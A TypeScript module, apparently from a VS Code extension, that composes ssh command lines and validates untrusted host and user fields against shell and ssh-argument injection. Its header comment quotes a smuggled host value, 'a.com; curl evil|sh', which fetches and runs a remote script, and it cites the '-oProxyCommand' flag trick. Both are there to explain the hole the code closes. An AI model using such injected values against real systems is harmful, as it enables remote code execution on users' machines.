/**
 * Composing an `ssh` command line from an entity. Pure and free of `vscode` so that
 * everything built on top of it — the details block, the clipboard text — can be tested
 * without an editor. `openSshTerminal` stays in `terminalManager.ts`, which needs one.
 *
 * <p><b>`host` and `user` are untrusted.</b> An entity does not only come from the form
 * on this machine: sync merges whatever is in a shared vault location, and Accept Share
 * imports whatever a colleague sealed. The envelope's GCM tag authenticates the CONTAINER,
 * not the plausibility of a field inside it — so a writer of the shared folder, or anyone
 * who can get a share accepted, chooses these strings.</p>
 *
 * <p>That matters twice over, because there are two different parsers downstream and each
 * has its own injection:</p>
 * <ul>
 *   <li><b>A shell.</b> The composed line goes to `terminal.sendText(line, true)` — the
 *       `true` presses Enter. `sshKeyPath` was quoted here from the beginning;
 *       `user@host` never was, so <code>a.com; curl evil|sh</code> ran on Connect.</li>
 *   <li><b>ssh's own argv parser.</b> A host beginning with <code>-</code> is a FLAG, not a
 *       hostname, and <code>-oProxyCommand=…</code> makes ssh run a local command before it
 *       authenticates anything. Verified against OpenSSH 10.3: the command executed.</li>
 * </ul>
 *
 * <p>So both are refused at composition rather than escaped. Escaping answers the first
 * parser and not the second, and a value that cannot be a hostname has no legitimate use.</p>
 *
 * <p><b>The remote word</b> (`options.remote`, E1.S2 of PLAN_terminal_command_over_ssh.md) is the third string
 * a person chose, and it is quoted for the LOCAL parse only, as ONE single-quoted literal (`quoteFor`, family
 * from `platform`). The remote shell parses its CONTENT, which is not this file's business. `--` stands before the
 * destination, so ssh reads nothing after it as an option.</p>
 */

import { EntityMetadata } from './types';
import { canConnectSsh } from './entityKind';
import { quoteFor } from './hostShell';
import { sshOptionArgv } from './sshOptions';
import { PathProbe, openSshProgram } from './sshProgram';

export const DEFAULT_SSH_PORT = 22;

/** What the caller resolved from the vault: the jump chain, and a pinned host key file. */
export interface SshCommandOptions {
  /** The `-J` value, already resolved and validated by `resolveJumpChain`. */
  jump?: string;
  /** A materialized known_hosts file holding this host's pinned key. */
  knownHostsFile?: string;
  /**
   * Whether the built-in Windows OpenSSH is installed. Injected only by tests, so that an
   * assertion about the composed line cannot depend on which machine runs it.
   */
  builtInExists?: (candidate: string) => boolean;
  /** How the PATH is probed for the built-in ssh. Injected only by tests, same reason. */
  pathProbe?: PathProbe;
  /**
   * The client to launch, when it is NOT the one this shell's platform implies.
   *
   * <p><b>The client's operating system and the shell's are two facts, and this is where they came
   * apart.</b> Everywhere else in this function `platform` answers both — which shell will parse the
   * line, and which `ssh` should run it — because everywhere else they are the same machine. In a
   * WSL window they are not: bash parses the line and a Windows `ssh.exe` runs it, reached through
   * interop at `/mnt/c/…`. Raised by a consultant in exactly those words, and it is the reason this
   * is a program WORD rather than a second platform: `openSshProgram` can pick between two Windows
   * spellings, but it has no vocabulary for a Windows binary named from inside Linux.</p>
   *
   * <p>Quoting is unaffected and must stay so: the arguments are still parsed by the shell, so they
   * are still quoted for `platform`. What changes is only which program the first word names — and
   * the paths the caller puts in `-i` and `UserKnownHostsFile`, which it leaves spelled the Windows
   * way because that is what this client reads.</p>
   */
  program?: string;
  /**
   * A command to run on the remote, as ONE argument. The line then ends `-- <destination> '<command>'`, and `-t` follows
   * the program word when `tty` is true. Without this field the output is byte-identical to before the field existed.
   * An empty command is refused (`undefined`): ssh would open a login shell, which is not what a caller that passed a
   * command meant.
   */
  remote?: { readonly command: string; readonly tty: boolean };
}

/**
 * Hostnames, IPv4, and bracketed IPv6 — and never a leading `-`, which ssh reads as an
 * option rather than a destination.
 */
export function isSafeSshHost(host: string): boolean {
  return host.length > 0 && host.length <= 255 && !host.startsWith('-') && /^[A-Za-z0-9._:\[\]-]+$/.test(host);
}

/**
 * POSIX account names, plus the backslash a Windows domain account needs
 * (`CORP\\alice`). No whitespace, no metacharacter, no leading `-`.
 */
export function isSafeSshUser(user: string): boolean {
  return user.length > 0 && user.length <= 64 && !user.startsWith('-') && /^[A-Za-z0-9._\\$-]+$/.test(user);
}

/** Both halves of a destination, checked together. */
// eslint-disable-next-line complexity
export function isSafeSshTarget(entity: EntityMetadata): boolean {
  if (!entity.host || !isSafeSshHost(entity.host)) {
    return false;
  }
  return entity.user === undefined || entity.user.length === 0 || isSafeSshUser(entity.user);
}

/**
 * Inside a double-quoted PowerShell word: the characters that END it (`"` and U+201C, U+201D, U+201E, which PowerShell
 * reads as double quotes — about_Quoting_Rules) and the ones that EXPAND (`$`, and the backtick). U+201F and U+2033 are
 * not read as a double quote by 5.1 or 7 today; they look like one, so they go to single quotes as well (defence in depth,
 * for a later PowerShell that reads one). Ordinary paths hold none of these, so their `"…"` spelling does not change.
 */
const POWERSHELL_DOUBLE_QUOTED_UNSAFE = /["\u201C\u201D\u201E\u201F\u2033$`]/;

/**
 * A bare PowerShell word that needs no quoting: letters, digits and the punctuation a host, a login, a port, a jump value
 * or an option name is made of. Anything else — `$` first of all — is quoted, because the line is typed into PowerShell.
 *
 * <p>Each character was read by Windows PowerShell 5.1 in ARGUMENT mode (2026-11-10). `,` is NOT here: `a,b` is an
 * ARRAY of two arguments, so a two-hop jump `-J hop1,hop2` reached ssh as `-J hop1 hop2 <dest>` and the second hop
 * became the destination. `= + : [ ] \ /` and a `@` inside a word are plain text. Two positions still change a word: a
 * leading `@` (a splat, or a parse error) and a word that starts with `-` and holds `:` (`-p:1` splits into `-p` and
 * `1`); the look-ahead refuses both.</p>
 */
const POWERSHELL_BARE_SAFE = /^(?!@|-[^:]*:)[A-Za-z0-9._:@\\/[\]=+-]+$/;

/** What an ordinary (nothing-to-escape) word looks like on win32: bare, or the `"…"` spelling a path has always had. */
type WindowsOrdinary = 'bare' | 'double-quoted';

/**
 * THE one win32 word rule: the line is typed into PowerShell, so every word the line carries is decided here.
 *
 * <ul>
 * <li>a value PowerShell would EXPAND or that could END a double-quoted word (`$`, the backtick, any double-quote
 *   character) is ONE PowerShell single-quoted word, built by the one PowerShell quoter (`hostShell.quoteFor`);</li>
 * <li>otherwise a path keeps its `"…"` spelling (`ordinary: 'double-quoted'`, which cmd reads too), byte-identical to
 *   what the builder always wrote;</li>
 * <li>otherwise a line word is bare when {@link POWERSHELL_BARE_SAFE} says so, and single-quoted when not.</li>
 * </ul>
 *
 * <p>`keyPrefix` is the `Name=` of a key-value option (`UserKnownHostsFile=`): it is a fixed plain name, it stays outside
 * the quotes of an ordinary path, and it goes INSIDE the single quotes when the value needs them, so `=` never splits
 * the word.</p>
 */
function windowsWord(value: string, ordinary: WindowsOrdinary, keyPrefix = ''): string {
  if (POWERSHELL_DOUBLE_QUOTED_UNSAFE.test(value)) {
    return quoteFor('powershell', `${keyPrefix}${value}`);
  }
  return ordinary === 'double-quoted' ? `${keyPrefix}"${value}"` : bareOrSingleQuoted(`${keyPrefix}${value}`);
}

/** A line word that nothing has to be escaped in: bare when plain, else one single-quoted word. */
function bareOrSingleQuoted(word: string): string {
  return POWERSHELL_BARE_SAFE.test(word) ? word : quoteFor('powershell', word);
}

/**
 * Quote a value for the integrated terminal's shell. On Windows shells
 * (PowerShell/cmd) backslashes are path separators, not escapes.
 *
 * <p>On win32 the word comes from `windowsWord` (see there). On POSIX shells escape the characters that are special
 * inside double quotes.</p>
 */
function shellQuote(value: string, platform: NodeJS.Platform = process.platform): string {
  if (platform === 'win32') {
    return windowsWord(value, 'double-quoted');
  }
  return `"${value.replace(/([\\"$`])/g, '\\$1')}"`;
}

/** One argument the options composer made, as the line must carry it: on win32 through the one word rule. */
function lineWord(word: string, platform: NodeJS.Platform): string {
  return platform === 'win32' ? windowsWord(word, 'bare') : word;
}

/** `user@host:port` (port omitted when default) â€” the connection identity. */
// eslint-disable-next-line complexity
export function describeSshTarget(entity: EntityMetadata): string | undefined {
  if (!isSafeSshTarget(entity)) {
    // Refused here too, so no dialog, terminal title or clipboard text ever
    // displays a target the connect path would refuse to use.
    return undefined;
  }
  const base = entity.user ? `${entity.user}@${entity.host}` : entity.host;
  return entity.port !== undefined && entity.port !== DEFAULT_SSH_PORT
    ? `${base}:${entity.port}`
    : base;
}

/**
 * Build the ssh command line for an entity:
 * `ssh -i "<sshKeyPath>" -p <port> <user>@<host>`
 * `-i` is omitted when no key path is set, `-p` when the port is empty or 22.
 * Returns undefined when the entity has no host.
 */
// eslint-disable-next-line complexity
export function buildSshCommand(
  entity: EntityMetadata,
  platform: NodeJS.Platform = process.platform,
  options: SshCommandOptions = {},
): string | undefined {
  if (!isSafeSshTarget(entity) || options.remote?.command === '') {
    return undefined;
  }
  const host = entity.host as string; // isSafeSshTarget above proved it non-empty
  // Not always the bare word: a connection that forwards the agent needs a client that can
  // reach ours, and on Windows the `ssh` first on PATH is usually the MSYS one, which cannot
  // open a named pipe. Composed here rather than at the five call sites so the command SHOWN
  // in the viewer is the command that runs. See `sshProgram.ts`.
  const parts: string[] = [
    options.program ??
      openSshProgram('ssh', entity.agentForward === true, platform, options.builtInExists, options.pathProbe),
  ];
  if (options.remote?.tty === true) {
    parts.push('-t');
  }
  if (entity.sshKeyPath) {
    parts.push('-i', shellQuote(entity.sshKeyPath, platform));
  }
  if (entity.port !== undefined && entity.port !== DEFAULT_SSH_PORT) {
    // A number by type, a string by data (sync and import write JSON): on win32 it goes through the word rule like the rest.
    parts.push('-p', lineWord(String(entity.port), platform));
  }
  // The connection-manager options (jump host, forwards, agent forwarding) are composed by
  // `sshOptions.ts` — the SAME function the agent's argv builder calls, so the two surfaces
  // cannot reach a host by different routes. Every element is already refused-or-safe there for a
  // POSIX shell and the ssh client, so they are appended as they are; on win32 `lineWord` quotes the
  // one that PowerShell would still read (a `$` in a login), because PowerShell is the parser there.
  parts.push(...sshOptionArgv(entity, options.jump).map((word) => lineWord(word, platform)));
  parts.push(...hostKeyArgv(options.knownHostsFile, platform));
  parts.push(...destinationArgv(entity.user ? `${entity.user}@${host}` : host, platform, options.remote));
  return parts.join(' ');
}

/**
 * The tail of the line: the destination alone, or — with a remote command — `--`, the destination and the command as
 * ONE word, last. The word is quoted by `quoteFor` for the shell of `platform` (never `shellQuote`: its `$` would
 * expand in PowerShell), because the typed line is parsed locally first and the remote sees only what is inside.
 */
function destinationArgv(destination: string, platform: NodeJS.Platform, remote: SshCommandOptions['remote']): string[] {
  const target = quotedDestination(destination, platform);
  return remote === undefined ? [target] : ['--', target, quoteFor(platform === 'win32' ? 'powershell' : 'posix', remote.command)];
}

/**
 * The ssh line a page SHOWS for an entry: exactly when the tree can connect to it over SSH (plan §4.5
 * and §11 of the agent-create plan). `buildSshCommand` stays a pure builder that asks only whether the
 * host is safe; the kind is asked here, through `canConnectSsh` — the tree's own question — because a
 * Terminal entry whose host an agent had filled with an API endpoint drew `ssh <endpoint>` in its
 * viewer, and because a second answer let the legacy host-only record offer *Connect via SSH* while
 * its viewer hid the line Connect runs.
 */
export function sshLineFor(entity: EntityMetadata): string | undefined {
  return canConnectSsh(entity) ? buildSshCommand(entity) : undefined;
}

/**
 * How the host key is checked, and it is the point of audit item B10.
 *
 * <p>With a pin, a known_hosts file holding exactly that key and `StrictHostKeyChecking=yes`: a
 * changed key then FAILS the connection. Without one, `accept-new` as before — but the caller is
 * expected to have shown the fingerprint first, which is the half that was missing.</p>
 */
/**
 * `user@host`, quoted only when the shell would otherwise change it.
 *
 * <p><b>This was the one argument on the line pushed on unquoted</b>, and it was survivable only
 * while every composed line went to a Windows shell, where a backslash is literal. A Windows domain
 * login is `CORP\alice`, `isSafeSshUser` admits `\` and `$` for exactly that reason, and composing
 * for a POSIX shell turns both into connecting as somebody else without a word. Measured in bash:</p>
 *
 * <pre>
 *   printf '&lt;%s&gt;' CORP\alice@host   -&gt;  &lt;CORPalice@host&gt;   the backslash is eaten
 *   printf '&lt;%s&gt;' a$HOME@host       -&gt;  &lt;a/root@host&gt;      the variable is expanded
 * </pre>
 *
 * <p>Conditional rather than always, and that is a deliberate trade. This line is READ and pasted
 * by people — the whole reason `openSshProgram` composes the program word here rather than at five
 * call sites — and `ssh "deploy@host"` on every ordinary connection is noise charged to everybody
 * for a case almost nobody has. The condition is not a judgement about danger: it asks whether the
 * text survives the round trip unchanged, which is the same question the quoting would answer.</p>
 */
function quotedDestination(destination: string, platform: NodeJS.Platform): string {
  if (platform === 'win32') {
    // PowerShell expands `$` in a bare word: a login may hold one (`isSafeSshUser`), a machine account ends in it.
    return lineWord(destination, platform);
  }
  return /[\\"$`]/.test(destination) ? shellQuote(destination, platform) : destination;
}

/** The `UserKnownHostsFile=<path>` word: on win32 a key-value word of the one word rule, `=` included in a quoted one. */
function knownHostsOption(file: string, platform: NodeJS.Platform): string {
  return platform === 'win32'
    ? windowsWord(file, 'double-quoted', 'UserKnownHostsFile=')
    : `UserKnownHostsFile=${shellQuote(file, platform)}`;
}

function hostKeyArgv(knownHostsFile: string | undefined, platform: NodeJS.Platform): string[] {
  if (knownHostsFile === undefined) {
    // NOTHING, deliberately — and this is the difference between the two paths. A human
    // terminal has a person in front of it, so ssh's own default (`ask`) prompts and they
    // answer; forcing `accept-new` here would take that question away, which is the silence
    // B10 is about. The agent's exec has nobody to ask and keeps `accept-new`; the password
    // branch in `sshConnect.ts` also forces it, because with SSH_ASKPASS_REQUIRE=force the
    // host-key question would otherwise be answered by the askpass program — with the password.
    return [];
  }
  return ['-o', 'StrictHostKeyChecking=yes', '-o', knownHostsOption(knownHostsFile, platform)];
}

/**
 * Open (or reuse) the terminal for this entity's full connection identity
 * (`SSH: user@host:port`, so two accounts on one host don't collide) and
 * run the ssh command. An existing live terminal is revealed as-is â€” it
 * most likely already holds a session; re-sending `ssh` into it would
 * type into the remote shell.
 */
